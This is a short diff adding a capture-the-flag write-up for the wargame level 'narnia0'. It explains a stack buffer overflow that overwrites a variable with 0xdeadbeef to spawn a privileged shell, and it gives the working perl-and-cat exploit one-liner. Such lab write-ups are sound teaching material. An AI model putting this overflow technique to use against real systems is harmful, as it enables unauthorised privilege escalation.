@@ -1,0 +1,8 @@
+This binary wants us to set a stack variable to 0xdeadbeef from 0x41414141 and then runs
+/bin/sh maintaining perms.
+
+Our input requires 5 words to stack as filler, then we hit the target.
+/bin/sh receives EOF once the perl output is done, so we need to pipe the output of
+/bin/cat after our exploit output to maintain the sh process.
+
+(perl -e 'print "A" x 20 . "\xef\xbe\xad\xde"' ; cat) | ./narnia0
